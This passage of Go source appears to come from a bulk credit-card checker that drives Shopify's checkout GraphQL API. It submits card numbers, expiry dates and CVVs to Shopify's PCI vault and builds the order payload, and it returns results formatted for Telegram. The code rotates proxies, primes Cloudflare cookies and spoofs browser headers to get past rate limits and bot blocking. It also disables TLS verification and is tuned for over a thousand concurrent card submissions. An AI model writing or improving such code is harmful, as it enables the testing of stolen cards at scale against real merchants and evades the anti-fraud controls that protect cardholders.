                "merchandise":          map[string]interface{}{"merchandiseLines": merchandiseLines},
                "memberships":      map[string]interface{}{"memberships": []interface{}{}},
                "poNumber":         nil,
                "payment": map[string]interface{}{
                        "totalAmount":    map[string]interface{}{"any": true},
                        "paymentLines":   []interface{}{},
                        "billingAddress": map[string]interface{}{"streetAddress": map[string]interface{}{
                                "address1": "", "city": "", "countryCode": addr.CountryCode,
                                "lastName": "", "zoneCode": addr.ZoneCode, "phone": "",
                        }},
                },
                "buyerIdentity": map[string]interface{}{
                        "customer":          map[string]interface{}{"presentmentCurrency": currency, "countryCode": addr.CountryCode},
                        "email":             email, "emailChanged": false,
                        "phoneCountryCode":  addr.CountryCode,
                        "marketingConsent":  []interface{}{map[string]interface{}{"email": map[string]interface{}{"value": email}}},
                        "shopPayOptInPhone": map[string]interface{}{"countryCode": addr.CountryCode},
                        "rememberMe":        false,
                },
                "tip":   map[string]interface{}{"tipLines": []interface{}{}},
                "taxes": map[string]interface{}{
                        "proposedAllocations": nil,
                        "proposedTotalAmount": map[string]interface{}{"value": map[string]interface{}{"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount": nil, "proposedMixedStateTotalAmount": nil,
                        "proposedExemptions": []interface{}{},
                },
                "note":                map[string]interface{}{"message": nil, "customAttributes": []interface{}{}},
                "localizationExtension": map[string]interface{}{"fields": []interface{}{}},
                "nonNegotiableTerms":  nil,
                "scriptFingerprint": map[string]interface{}{
                        "signature": nil, "signatureUuid": nil,
                        "lineItemScriptChanges": []interface{}{}, "paymentScriptChanges": []interface{}{},
                        "shippingScriptChanges": []interface{}{},
                },
                "optionalDuties":         map[string]interface{}{"buyerRefusesDuties": false},
                "transformerFingerprintV2": nil,
        }

        proposalBody := map[string]interface{}{
                "id":            opIDProposal,
                "variables":     proposalVars,
                "operationName": "Proposal",
        }

        var respText string
        for i := 0; i < 2; i++ {
                _, respText, err = doGQLRequest(client, gqlURL, map[string]string{"operationName": "Proposal"}, gqlHeaders, proposalBody)
                if err != nil {
                        if i == 1 {
                                return CheckResult{false, "Proposal request failed: " + err.Error(), gateway, totalPrice, currency}
                        }
                        time.Sleep(time.Second)
                        continue
                }
                trimmed := strings.TrimSpace(respText)
                if trimmed != "" && !strings.HasPrefix(strings.ToLower(trimmed[:min(15, len(trimmed))]), "<") {
                        break
                }
                if i == 0 {
                        time.Sleep(time.Second)
                }
        }

        if isCaptchaRequired(respText) {
                return CheckResult{false, "CARD_DECLINED", gateway, totalPrice, currency}
        }
        if respText == "" {
                return CheckResult{false, "Empty response (Proposal shipping)", gateway, totalPrice, currency}
        }

        var propResp map[string]interface{}
        if err := json.Unmarshal([]byte(respText), &propResp); err != nil {
                return CheckResult{false, "Invalid JSON from Proposal: " + err.Error(), gateway, totalPrice, currency}
        }
        if errs, ok := propResp["errors"]; ok {
                errList, _ := errs.([]interface{})
                msgs := make([]string, 0)
                for _, e := range errList {
                        if em, ok := e.(map[string]interface{}); ok {
                                msgs = append(msgs, fmt.Sprintf("%v", em["message"]))
                        }
                }
                return CheckResult{false, "GraphQL Error: " + strings.Join(msgs, "; "), gateway, totalPrice, currency}
        }

        // Parse result
        data := navMap(propResp, "data", "session", "negotiate")
        if data == nil {
                return CheckResult{false, "No negotiate in response", gateway, totalPrice, currency}
        }
        result := navMap(data, "result")
        if result == nil {
                return CheckResult{false, "No result in negotiate", gateway, totalPrice, currency}
        }
        resultType := fmt.Sprintf("%v", result["__typename"])
        switch resultType {
        case "CheckpointDenied":
                return CheckResult{false, "Checkpoint Denied", gateway, totalPrice, currency}
        case "Throttled":
                return CheckResult{false, "Throttled", gateway, totalPrice, currency}
        case "NegotiationResultFailed":
                return CheckResult{false, "Negotiation failed", gateway, totalPrice, currency}
        }

        if newQT := fmt.Sprintf("%v", result["queueToken"]); newQT != "" && newQT != "<nil>" {
                queueToken = newQT
                proposalVars["queueToken"] = queueToken
        }

        // Extract checkpointData — api.py: checkpoint_data = result.get('checkpointData')
        // Shopify returns this on some stores; must be forwarded in submit input.
        checkpointData := ""
        if cd := fmt.Sprintf("%v", result["checkpointData"]); cd != "" && cd != "<nil>" {
                checkpointData = cd
        }

        sellerProp := navMap(result, "sellerProposal")
        if sellerProp == nil {
                return CheckResult{false, "Seller proposal null", gateway, totalPrice, currency}
        }
        if tfv := fmt.Sprintf("%v", sellerProp["transformerFingerprintV2"]); tfv != "" && tfv != "<nil>" {
                proposalVars["transformerFingerprintV2"] = tfv
        }

        // Extract payment identifier (gateway) â€” prefer direct card methods over digital wallets
        paymentLines := navSlice(sellerProp, "payment", "availablePaymentLines")
        paymentIdentifier := ""
        isNonCardGateway := func(name, id string) bool {
                chk := strings.ToLower(name + " " + id)
                for _, kw := range []string{
                        "paypal", "google_pay", "googlepay", "shop_pay", "shoppay", "shop pay",
                        "shopify_installments", "klarna", "afterpay", "afterpay_clearpay", "clearpay",
                        "sezzle", "affirm", "zip", "laybuy", "amazon_pay", "amazon pay",
                        "apple_pay", "applepay",
                } {
                        if strings.Contains(chk, kw) {
                                return true
                        }
                }
                return false
        }
        fallbackPayID, fallbackGW := "", ""
        for _, pl := range paymentLines {
                pm := navMap(pl, "paymentMethod")
                if pm == nil {
                        continue
                }
                id := fmt.Sprintf("%v", pm["paymentMethodIdentifier"])
                name := fmt.Sprintf("%v", pm["name"])
                disp := fmt.Sprintf("%v", pm["extensibilityDisplayName"])
                if disp == "<nil>" || disp == "" {
                        disp = name
                }
                if id == "" || id == "<nil>" {
                        continue
                }
                if isNonCardGateway(disp, id) {
                        // store as fallback in case no direct-card method exists
                        if fallbackPayID == "" {
                                fallbackPayID = id
                                if disp != "" && disp != "<nil>" {
                                        fallbackGW = disp
                                } else if name != "" && name != "<nil>" {
                                        fallbackGW = name
                                }
                        }
                        continue
                }
                // Direct card-accepting method found â€” use it
                paymentIdentifier = id
                if disp != "" && disp != "<nil>" {
                        gateway = disp
                } else if name != "" && name != "<nil>" {
                        gateway = name
                }
                break
        }
        if paymentIdentifier == "" && fallbackPayID != "" {
                // only digital-wallet gateways available â€” use fallback and let Shopify respond
                paymentIdentifier = fallbackPayID
                gateway = fallbackGW
        }
        if paymentIdentifier == "" {
                return CheckResult{false, "No payment method available", gateway, totalPrice, currency}
        }

        // Extract delivery + tax + shipping amounts
        runningTotal := "0.00"
        if rt := navMap(sellerProp, "runningTotal", "value"); rt != nil {
                runningTotal = fmt.Sprintf("%v", rt["amount"])
        }
        taxAmount := "0"
        if ta := navMap(sellerProp, "tax", "totalTaxAmount", "value"); ta != nil {
                taxAmount = fmt.Sprintf("%v", ta["amount"])
        }
        shippingAmount := "0"
        deliveryStrategy := ""
        if dlLines := navSlice(sellerProp, "delivery", "deliveryLines"); len(dlLines) > 0 {
                dlLine := navMap(dlLines[0])
                if dlLine != nil {
                        strategies := navSlice(dlLine, "availableDeliveryStrategies")
                        if len(strategies) > 0 {
                                strat := navMap(strategies[0])
                                if strat != nil {
                                        deliveryStrategy = fmt.Sprintf("%v", strat["handle"])
                                        if amt := navMap(strat, "amount", "value"); amt != nil {
                                                shippingAmount = fmt.Sprintf("%v", amt["amount"])
                                        }
                                }
                        }
                }
        }

        // Compute the real total price the same way Python does:
        // total_price = str(float(running_total) + shipping_amount + tax_amount)
        if rt, err2 := strconv.ParseFloat(runningTotal, 64); err2 == nil {
                ship, _ := strconv.ParseFloat(shippingAmount, 64)
                tax, _ := strconv.ParseFloat(taxAmount, 64)
                totalPrice = fmt.Sprintf("%.2f", rt+ship+tax)
        }

        deliveryVars := deepCopyMap(proposalVars)
        if !requiresShipping {
                deliveryVars["delivery"] = map[string]interface{}{
                        "deliveryLines": []interface{}{map[string]interface{}{
                                "selectedDeliveryStrategy": map[string]interface{}{
                                        "deliveryStrategyMatchingConditions": map[string]interface{}{
                                                "estimatedTimeInTransit": map[string]interface{}{"any": true},
                                                "shipments":              map[string]interface{}{"any": true},
                                        },
                                        "options": map[string]interface{}{},
                                },
                                "targetMerchandiseLines": map[string]interface{}{"lines": []interface{}{map[string]interface{}{"stableId": stableID}}},
                                "deliveryMethodTypes":    []string{"NONE"},
                                "expectedTotalPrice":     map[string]interface{}{"any": true},
                                "destinationChanged":     true,
                        }},
                        "noDeliveryRequired":           []interface{}{},
                        "useProgressiveRates":          false,
                        "prefetchShippingRatesStrategy": nil,
                        "supportsSplitShipping":        true,
                }
        } else {
                if dl, ok := deliveryVars["delivery"].(map[string]interface{}); ok {
                        if dlLines, ok := dl["deliveryLines"].([]interface{}); ok && len(dlLines) > 0 {
                                if dlLine, ok := dlLines[0].(map[string]interface{}); ok {
                                        dlLine["selectedDeliveryStrategy"] = map[string]interface{}{
                                                "deliveryStrategyByHandle": map[string]interface{}{
                                                        "handle":           deliveryStrategy,
                                                        "customDeliveryRate": false,
                                                },
                                                "options": map[string]interface{}{},
                                        }
                                        dlLine["targetMerchandiseLines"] = map[string]interface{}{"lines": []interface{}{map[string]interface{}{"stableId": stableID}}}
                                        dlLine["expectedTotalPrice"] = map[string]interface{}{"value": map[string]interface{}{"amount": shippingAmount, "currencyCode": currency}}
                                        dlLine["destinationChanged"] = false
                                }
                        }
                }
        }
        deliveryVars["payment"].(map[string]interface{})["billingAddress"] = map[string]interface{}{
                "streetAddress": map[string]interface{}{
                        "address1": addr.Address1, "address2": "", "city": addr.City,
                        "countryCode": addr.CountryCode, "postalCode": addr.PostalCode,
                        "firstName": firstName, "lastName": lastName,
                        "zoneCode": addr.ZoneCode, "phone": addr.Phone,
                },
        }
        if taxes, ok := deliveryVars["taxes"].(map[string]interface{}); ok {
                if pt, ok := taxes["proposedTotalAmount"].(map[string]interface{}); ok {
                        if val, ok := pt["value"].(map[string]interface{}); ok {
                                val["amount"] = taxAmount
                        }
                }
        }

        deliveryBody := map[string]interface{}{
                "id":            opIDProposal,
                "variables":     deliveryVars,
                "operationName": "Proposal",
        }
        _, delivRespText, _ := doGQLRequest(client, gqlURL, map[string]string{"operationName": "Proposal"}, gqlHeaders, deliveryBody)
        if delivRespText != "" {
                var d2 map[string]interface{}
                if json.Unmarshal([]byte(delivRespText), &d2) == nil {
                        r2 := navMap(d2, "data", "session", "negotiate", "result")
                        if r2 != nil {
                                if newQT := fmt.Sprintf("%v", r2["queueToken"]); newQT != "" && newQT != "<nil>" {
                                        queueToken = newQT
                                        proposalVars["queueToken"] = queueToken
                                        deliveryVars["queueToken"] = queueToken
                                }
                                sp2 := navMap(r2, "sellerProposal")
                                if sp2 != nil {
                                        if tfv := fmt.Sprintf("%v", sp2["transformerFingerprintV2"]); tfv != "" && tfv != "<nil>" {
                                                deliveryVars["transformerFingerprintV2"] = tfv
                                                proposalVars["transformerFingerprintV2"] = tfv
                                        }
                                }
                        }
                }
                // ── Refresh session token from delivery response ────────────────────
                if newSST := extractBetween(delivRespText, `"sessionToken":"`, `"`); newSST != "" {
                        sst = newSST
                        gqlHeaders["x-checkout-one-session-token"] = sst
                }
                // ── Delivery handle regex fallbacks from raw response text ─────────
                if deliveryStrategy == "" {
                        // Pattern 1: selectedDeliveryStrategy with CompleteDeliveryStrategy typename
                        if m := regexp.MustCompile(`"selectedDeliveryStrategy"\s*:\s*\{"handle"\s*:\s*"([^"]+)"\s*,\s*"__typename"\s*:\s*"CompleteDeliveryStrategy"`).FindStringSubmatch(delivRespText); len(m) > 1 {
                                deliveryStrategy = m[1]
                        }
                }
                if deliveryStrategy == "" {
                        // Pattern 2: UUID-style handle (32hex-32hex)
                        if m := regexp.MustCompile(`"handle"\s*:\s*"([a-f0-9]{32}-[a-f0-9]{32})"`).FindStringSubmatch(delivRespText); len(m) > 1 {
                                deliveryStrategy = m[1]
                        }
                }
                if deliveryStrategy == "" {
                        // Pattern 3: signedHandle fallback
                        if m := regexp.MustCompile(`"signedHandle"\s*:\s*"([^"]+)"`).FindStringSubmatch(delivRespText); len(m) > 1 {
                                deliveryStrategy = m[1]
                        }
                }
        }

        monthInt, _ := strconv.Atoi(mes)
        yearInt, _ := strconv.Atoi(ano)
        // ── payment_session_scope: use vault domain from HTML if available ─────────
        pciScope := vaultDomain
        if pciScope == "" {
                pciScope = parseHostname(ourl)
        }
        // ── vault endpoint: use extracted URL if available ─────────────────────────
        pciEndpoint := vaultURL
        if pciEndpoint == "" {
                pciEndpoint = "https://checkout.pci.shopifyinc.com/sessions"
        }
        // ── pci host for origin/referer headers ────────────────────────────────────
        pciHost := "checkout.pci.shopifyinc.com"
        if pu, perr := url.Parse(pciEndpoint); perr == nil && pu.Host != "" {
                pciHost = pu.Host
        }

        vaultPayload := map[string]interface{}{
                "credit_card": map[string]interface{}{
                        "number":             cc,
                        "month":              monthInt,
                        "year":               yearInt,
                        "verification_value": cvv,
                        "start_month":        nil,
                        "start_year":         nil,
                        "issue_number":       "",
                        "name":               firstName + " " + lastName,
                },
                "payment_session_scope": pciScope,
        }
        vaultPayloadBytes, _ := json.Marshal(vaultPayload)
        // Build the vault referer using the extracted build ID if available, else a recent fallback
        vaultBuildID := buildID
        if vaultBuildID == "" {
                vaultBuildID = "a8e4a94"
        }
        vaultReferer := "https://" + pciHost + "/build/" + vaultBuildID + "/number-ltr.html?identifier=&locationURL="

        vaultHeaders := map[string]string{
                "content-type":                 "application/json",
                "accept":                       "application/json",
                "accept-language":              acceptLang,
                "origin":                       "https://" + pciHost,
                "referer":                      vaultReferer,
                "user-agent":                   ua.UA,
                "sec-fetch-dest":               "empty",
                "sec-fetch-mode":               "cors",
                "sec-fetch-site":               "same-origin",
                "sec-fetch-storage-access":     "active",
        }
        if ua.ChUA != "" {
                vaultHeaders["sec-ch-ua"] = ua.ChUA
                vaultHeaders["sec-ch-ua-mobile"] = ua.ChMobile
                vaultHeaders["sec-ch-ua-platform"] = ua.ChPlatform
        }
        if identSig != "" {
                vaultHeaders["shopify-identification-signature"] = identSig
                vaultHeaders["x-checkout-cardsink-caller-identification-signature"] = identSig
        }

        // Use a plain net/http client for vault — no TLS fingerprint needed for the PCI endpoint.
        // Cookie jar is REQUIRED: the CF preflight GET sets _cf_bm/_cfuvid cookies that must be
        // sent with the vault POST — without a shared jar, CF sees a cold POST and returns 403/429.
        // Proxy is REQUIRED: bare VPS IP triggers CF rate-limit (429) on concurrent vault calls.
        // Connection pool: tuned for 1000+ concurrent vault calls. Without MaxIdleConnsPerHost,
        // Go keeps only 2 idle connections per host — every 3rd request does a fresh TLS handshake
        // (~300ms) which under load causes queue buildup and 503 timeouts.
        vaultJar, _ := cookiejar.New(nil)
        vaultTransport := &http.Transport{
                TLSHandshakeTimeout:   8 * time.Second,
                ResponseHeaderTimeout: 12 * time.Second,
                TLSClientConfig:       &tls.Config{InsecureSkipVerify: true}, // mirrors api.py ssl=False
                DialContext: (&net.Dialer{
                        Timeout:   8 * time.Second,
                        KeepAlive: 30 * time.Second,
                }).DialContext,
                MaxIdleConns:          500,
                MaxIdleConnsPerHost:   200,
                MaxConnsPerHost:       0,
                IdleConnTimeout:       60 * time.Second,
        }
        if proxyURL != "" {
                if pu, perr := url.Parse(proxyURL); perr == nil {
                        vaultTransport.Proxy = http.ProxyURL(pu)
                }
        }
        vaultClient := &http.Client{
                Timeout:   time.Duration(vaultTimeoutSec) * time.Second,
                Jar:       vaultJar,
                Transport: vaultTransport,
        }

        // ── DEBUG: log vault pre-conditions ──────────────────────────────────────
        log.Printf("[VAULT] site=%s endpoint=%s scope=%s identSig=%v vaultURL_from_html=%v vaultDomain_from_html=%v",
                parseHostname(ourl), pciEndpoint, pciScope,
                identSig != "", vaultURL != "", vaultDomain != "")

        // ── Pre-vault GET to card_fields.js — primes Cloudflare _cf_bm cookies ────
        // Real browsers always load this JS before POSTing to /sessions.
        // Without it, CF sees a cold POST with no cookies -> returns 429/403.
        {
                cfReq, cfErr := http.NewRequest("GET", "https://"+pciHost+"/dist/card_fields.js", nil)
                if cfErr == nil {
                        cfReq.Header.Set("accept", "*/*")
                        cfReq.Header.Set("accept-language", "en-US,en;q=0.9")
                        cfReq.Header.Set("referer", ourl)
                        cfReq.Header.Set("user-agent", ua.UA)
                        cfReq.Header.Set("sec-fetch-dest", "script")
                        cfReq.Header.Set("sec-fetch-mode", "no-cors")
                        cfReq.Header.Set("sec-fetch-site", "cross-site")
                        if ua.ChUA != "" {
                                cfReq.Header.Set("sec-ch-ua", ua.ChUA)
                                cfReq.Header.Set("sec-ch-ua-mobile", ua.ChMobile)
                                cfReq.Header.Set("sec-ch-ua-platform", ua.ChPlatform)
                        }
                        if cfResp, cfRErr := vaultClient.Do(cfReq); cfRErr == nil {
                                log.Printf("[VAULT] CF preflight GET card_fields.js -> %d", cfResp.StatusCode)
                                io.Copy(io.Discard, cfResp.Body)
                                cfResp.Body.Close()
                        } else {
                                log.Printf("[VAULT] CF preflight GET card_fields.js FAILED: %v", cfRErr)
                        }
                }
        }

        // ── extractVaultToken: try all known field names (matching Python ex_pci_fields) ──
        extractVaultToken := func(body []byte) string {
                var td map[string]interface{}
                if json.Unmarshal(body, &td) == nil {
                        for _, key := range []string{"id", "token", "payment_token", "payment_session_id", "session_id"} {
                                if v := fmt.Sprintf("%v", td[key]); v != "" && v != "<nil>" && v != "null" {
                                        return v
                                }
                        }
                        // nested data.id
                        if dataMap, ok := td["data"].(map[string]interface{}); ok {
                                if v := fmt.Sprintf("%v", dataMap["id"]); v != "" && v != "<nil>" && v != "null" {
                                        return v
                                }
                        }
                }
                // Regex fallback — ONLY for malformed/partial JSON that failed to parse
                for _, pat := range []string{
                        `"id"\s*:\s*"([^"]+)"`,
                        `"token"\s*:\s*"([^"]+)"`,
                        `"payment_session_id"\s*:\s*"([^"]+)"`,
                        `"session_id"\s*:\s*"([^"]+)"`,
                } {
                        if m := regexp.MustCompile(pat).FindSubmatch(body); len(m) > 1 {
                                return string(m[1])
                        }
                }
                return ""
        }

        vaultAttempt := 0
        doVault := func() (string, error) {
                vaultAttempt++
                // ── PCI semaphore: cap concurrent vault calls to avoid CF 429 burst ──
                pciSemaphore <- struct{}{}
                defer func() { <-pciSemaphore }()

                req, _ := http.NewRequest("POST", pciEndpoint, bytes.NewReader(vaultPayloadBytes))
                headerOrder := []string{
                        "content-type", "accept", "accept-language",
                        "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
                        "origin", "referer", "user-agent",
                        "sec-fetch-dest", "sec-fetch-mode", "sec-fetch-site", "sec-fetch-storage-access",
                        "shopify-identification-signature", "x-checkout-cardsink-caller-identification-signature",
                }
                for _, k := range headerOrder {
                        if v, ok := vaultHeaders[k]; ok {
                                req.Header.Set(k, v)
                        }
                }
                resp, err := vaultClient.Do(req)
                if err != nil {
                        errStr := err.Error()
                        // Classify error for easier debugging
                        errKind := "CONN_ERR"
                        if strings.Contains(errStr, "Payment Required") || strings.Contains(errStr, "402") {
                                errKind = "PROXY_402_EXHAUSTED"
                        } else if strings.Contains(errStr, "Authentication Required") || strings.Contains(errStr, "407") {
                                errKind = "PROXY_AUTH_FAIL"
                        } else if strings.Contains(errStr, "timeout") || strings.Contains(errStr, "i/o timeout") {
                                errKind = "TIMEOUT"
                        } else if strings.Contains(errStr, "connection refused") {
                                errKind = "CONN_REFUSED"
                        } else if strings.Contains(errStr, "no such host") {
                                errKind = "DNS_FAIL"
                        } else if strings.Contains(errStr, "proxyconnect") {
                                errKind = "PROXY_CONNECT_FAIL"
                        }
                        log.Printf("[VAULT] attempt=%d kind=%s POST error: %v", vaultAttempt, errKind, err)
                        return "", fmt.Errorf("%s: %s", errKind, errStr)
                }
                defer resp.Body.Close()
                body, _ := io.ReadAll(resp.Body)
                preview := string(body)
                if len(preview) > 500 {
                        preview = preview[:500]
                }
                log.Printf("[VAULT] attempt=%d status=%d body=%s", vaultAttempt, resp.StatusCode, preview)
                // 429 = rate-limited; 403 = CF blocking; both logged differently
                if resp.StatusCode == 429 {
                        return "", fmt.Errorf("RATE_LIMITED_429 body=%s", preview)
                }
                if resp.StatusCode == 403 {
                        return "", fmt.Errorf("CF_403_FORBIDDEN body=%s", preview)
                }
                id := extractVaultToken(body)
                if id == "" {
                        return "", fmt.Errorf("NO_TOKEN status=%d body=%s", resp.StatusCode, preview)
                }
                return id, nil
        }

        // Retry up to 3 times with backoff for all error types
        token := ""
        var vaultErr error
        proxyMasked := ""
        if proxyURL != "" {
                // Mask credentials for logging: http://user:pass@host:port → http://***@host:port
                if atIdx := strings.LastIndex(proxyURL, "@"); atIdx > 0 {
                        proxyMasked = "http://***@" + proxyURL[atIdx+1:]
                } else {
                        proxyMasked = proxyURL
                }
        }
        log.Printf("[VAULT] start site=%s proxy=%q scope=%s", parseHostname(ourl), proxyMasked, pciScope)

        for attempt := 0; attempt < 3; attempt++ {
                token, vaultErr = doVault()
                if token != "" {
                        break
                }
                if vaultErr != nil {
                        errStr := vaultErr.Error()
                        sleepMs := 500 + attempt*400
                        if strings.Contains(errStr, "RATE_LIMITED") {
                                sleepMs = 800 + attempt*600
                        } else if strings.Contains(errStr, "CF_403") {
                                // 403 from CF — back off longer, VPS IP may be temporarily blocked
                                sleepMs = 1000 + attempt*800
                        }
                        log.Printf("[VAULT] proxy_attempt=%d failed err=%v sleep=%dms", attempt+1, vaultErr, sleepMs)
                        time.Sleep(time.Duration(sleepMs) * time.Millisecond)
                }
        }

        // Direct fallback: trigger on ANY failure — connection errors, proxy 402, CF 403, NO_TOKEN.
        // VPS IP can reach checkout.pci.shopifyinc.com directly (confirmed: 200 without proxy).
        // Do NOT skip on CF_403 — CF may allow VPS IP on a different route than the proxy IP.
        if token == "" && vaultErr != nil {
                shouldFallback := proxyURL != "" // only makes sense if proxy was being used
                if shouldFallback {
                        log.Printf("[VAULT] all proxy attempts failed (%v) — falling back to DIRECT site=%s", vaultErr, parseHostname(ourl))
                        // Build a genuinely proxy-free transport (Proxy: nil prevents env-var proxy pickup)
                        directJar, _ := cookiejar.New(nil)
                directTransport := &http.Transport{
                        Proxy:               nil, // explicit nil — ignore HTTP_PROXY env var
                        TLSHandshakeTimeout:   10 * time.Second,
                        ResponseHeaderTimeout: 15 * time.Second,
                        TLSClientConfig:       &tls.Config{InsecureSkipVerify: true}, // mirrors api.py ssl=False
                        DialContext: (&net.Dialer{
                                Timeout:   10 * time.Second,
                                        KeepAlive: 30 * time.Second,
                                }).DialContext,
                                MaxIdleConns:        200,
                                MaxIdleConnsPerHost: 100,
                                MaxConnsPerHost:     0,
                                IdleConnTimeout:     60 * time.Second,
                        }
                        directVaultClient := &http.Client{
                                Timeout:   time.Duration(vaultTimeoutSec) * time.Second,
                                Jar:       directJar,
                                Transport: directTransport,
                        }
                        // Prime CF cookies on the direct path
                        if cfReq2, e2 := http.NewRequest("GET", "https://"+pciHost+"/dist/card_fields.js", nil); e2 == nil {
                                cfReq2.Header.Set("accept", "*/*")
                                cfReq2.Header.Set("user-agent", ua.UA)
                                cfReq2.Header.Set("referer", ourl)
                                cfReq2.Header.Set("sec-fetch-site", "cross-site")
                                cfReq2.Header.Set("sec-fetch-mode", "no-cors")
                                if ua.ChUA != "" {
                                        cfReq2.Header.Set("sec-ch-ua", ua.ChUA)
                                        cfReq2.Header.Set("sec-ch-ua-mobile", ua.ChMobile)
                                        cfReq2.Header.Set("sec-ch-ua-platform", ua.ChPlatform)
                                }
                                if cr2, crErr := directVaultClient.Do(cfReq2); crErr == nil {
                                        log.Printf("[VAULT] direct_preflight card_fields.js -> %d", cr2.StatusCode)
                                        io.Copy(io.Discard, cr2.Body)
                                        cr2.Body.Close()
                                } else {
                                        log.Printf("[VAULT] direct_preflight card_fields.js FAILED: %v", crErr)
                                }
                        }
                        // Swap to direct client and retry up to 3 times
                        oldClient := vaultClient
                        vaultClient = directVaultClient
                        for attempt := 0; attempt < 3; attempt++ {
                                token, vaultErr = doVault()
                                if token != "" {
                                        log.Printf("[VAULT] direct fallback SUCCESS attempt=%d site=%s", attempt+1, parseHostname(ourl))
                                        break
                                }
                                if vaultErr != nil {
                                        sleepMs := 600 + attempt*500
                                        log.Printf("[VAULT] direct_attempt=%d failed err=%v sleep=%dms", attempt+1, vaultErr, sleepMs)
                                        time.Sleep(time.Duration(sleepMs) * time.Millisecond)
                                }
                        }
                        vaultClient = oldClient
                }
        }

        if token == "" {
                errMsg := "Unable to get payment token"
                if vaultErr != nil {
                        raw := vaultErr.Error()
                        // Classify for Telegram message — short, readable
                        switch {
                        case strings.Contains(raw, "CF_403"):
                                errMsg = "Vault: CF 403 Forbidden (VPS IP blocked)"
                        case strings.Contains(raw, "RATE_LIMITED_429"):
                                errMsg = "Vault: Rate Limited (429)"
                        case strings.Contains(raw, "PROXY_402"):
                                errMsg = "Vault: Proxy out of quota (402)"
                        case strings.Contains(raw, "TIMEOUT"):
                                errMsg = "Vault: Connection Timeout"
                        case strings.Contains(raw, "PROXY_CONNECT_FAIL"):
                                errMsg = "Vault: Proxy connect failed"
                        case strings.Contains(raw, "NO_TOKEN"):
                                errMsg = "Vault: No token in response"
                        default:
                                raw = strings.ReplaceAll(raw, "<", "(")
                                raw = strings.ReplaceAll(raw, ">", ")")
                                errMsg = "Vault: " + raw
                        }
                }
                log.Printf("[VAULT] *** FINAL FAIL *** site=%s proxy=%q err=%v → msg=%q",
                        parseHostname(ourl), proxyMasked, vaultErr, errMsg)
                return CheckResult{false, errMsg, gateway, totalPrice, currency}
        }
        log.Printf("[VAULT] *** SUCCESS *** site=%s proxy=%q token_prefix=%s", parseHostname(ourl), proxyMasked, token[:min(len(token), 12)])

        var submitDelivery interface{}
        if !requiresShipping {
                submitDelivery = map[string]interface{}{
                        "deliveryLines": []interface{}{map[string]interface{}{
                                "selectedDeliveryStrategy": map[string]interface{}{
                                        "deliveryStrategyMatchingConditions": map[string]interface{}{
                                                "estimatedTimeInTransit": map[string]interface{}{"any": true},
                                                "shipments":              map[string]interface{}{"any": true},
                                        },
                                        "options": map[string]interface{}{},
                                },
                                "targetMerchandiseLines": map[string]interface{}{"lines": []interface{}{map[string]interface{}{"stableId": stableID}}},
                                "deliveryMethodTypes":    []string{"NONE"},
                                "expectedTotalPrice":     map[string]interface{}{"any": true},
                                "destinationChanged":     true,
                        }},
                        "noDeliveryRequired":           []interface{}{},
                        "useProgressiveRates":          false,
                        "prefetchShippingRatesStrategy": nil,
                        "supportsSplitShipping":        true,
                }
        } else {
                submitDelivery = map[string]interface{}{
                        "deliveryLines": []interface{}{map[string]interface{}{
                                "destination": map[string]interface{}{
                                        "streetAddress": map[string]interface{}{
                                                "address1": addr.Address1, "address2": "", "city": addr.City,
                                                "countryCode": addr.CountryCode, "postalCode": addr.PostalCode,
                                                "firstName": firstName, "lastName": lastName,
                                                "zoneCode": addr.ZoneCode, "phone": addr.Phone,
                                        },
                                },
                                "selectedDeliveryStrategy": map[string]interface{}{
                                        "deliveryStrategyByHandle": map[string]interface{}{
                                                "handle":           deliveryStrategy,
                                                "customDeliveryRate": false,
                                        },
                                        "options": map[string]interface{}{"phone": addr.Phone},
                                },
                                "targetMerchandiseLines": map[string]interface{}{"lines": []interface{}{map[string]interface{}{"stableId": stableID}}},
                                "deliveryMethodTypes":    []string{"SHIPPING"},
                                "expectedTotalPrice":     map[string]interface{}{"value": map[string]interface{}{"amount": shippingAmount, "currencyCode": currency}},
                                "destinationChanged":     false,
                        }},
                        "noDeliveryRequired":           []interface{}{},
                        "useProgressiveRates":          true,
                        "prefetchShippingRatesStrategy": nil,
                        "supportsSplitShipping":        true,
                }
        }

        submitVars := map[string]interface{}{
                "input": map[string]interface{}{
                        "sessionInput": map[string]interface{}{"sessionToken": sst},
                        "queueToken":   queueToken,
                        "discounts":    map[string]interface{}{"lines": []interface{}{}, "acceptUnexpectedDiscounts": true},
                        "delivery":     submitDelivery,
                        "deliveryExpectations": map[string]interface{}{"deliveryExpectationLines": []interface{}{}},
                        "merchandise":  map[string]interface{}{"merchandiseLines": merchandiseLines},
                        "memberships":     map[string]interface{}{"memberships": []interface{}{}},
                        "poNumber":        nil,
                        "payment": map[string]interface{}{
                                "totalAmount": map[string]interface{}{"any": true},
                                "paymentLines": []interface{}{map[string]interface{}{
                                        "paymentMethod": map[string]interface{}{
                                                "directPaymentMethod": map[string]interface{}{
                                                        "paymentMethodIdentifier": paymentIdentifier,
                                                        "sessionId":               token,
                                                        "billingAddress": map[string]interface{}{
                                                                "streetAddress": map[string]interface{}{
                                                                        "address1": addr.Address1, "address2": "", "city": addr.City,
                                                                        "countryCode": addr.CountryCode, "postalCode": addr.PostalCode,
                                                                        "firstName": firstName, "lastName": lastName,
                                                                        "zoneCode": addr.ZoneCode, "phone": addr.Phone,
                                                                },
                                                        },
                                                        "cardSource": nil,
                                                },
                                        },
                                        "amount": map[string]interface{}{"any": true},
                                        "dueAt":  nil,
                                }},
                                "billingAddress": map[string]interface{}{
                                        "streetAddress": map[string]interface{}{
                                                "address1": addr.Address1, "address2": "", "city": addr.City,
                                                "countryCode": addr.CountryCode, "postalCode": addr.PostalCode,
                                                "firstName": firstName, "lastName": lastName,
                                                "zoneCode": addr.ZoneCode, "phone": addr.Phone,
                                        },
                                },
                        },
                        "buyerIdentity": map[string]interface{}{
                                "customer":          map[string]interface{}{"presentmentCurrency": currency, "countryCode": addr.CountryCode},
                                "email":             email, "emailChanged": false,
                                "phoneCountryCode":  addr.CountryCode,
                                "marketingConsent":  []interface{}{map[string]interface{}{"email": map[string]interface{}{"value": email}}},
                                "shopPayOptInPhone": map[string]interface{}{"number": addr.Phone, "countryCode": addr.CountryCode},
                                "rememberMe":        false,
                        },
                        "taxes": map[string]interface{}{
                                "proposedAllocations": nil,
                                "proposedTotalAmount": map[string]interface{}{"value": map[string]interface{}{"amount": taxAmount, "currencyCode": currency}},
                                "proposedTotalIncludedAmount": nil, "proposedMixedStateTotalAmount": nil,
                                "proposedExemptions": []interface{}{},
                        },
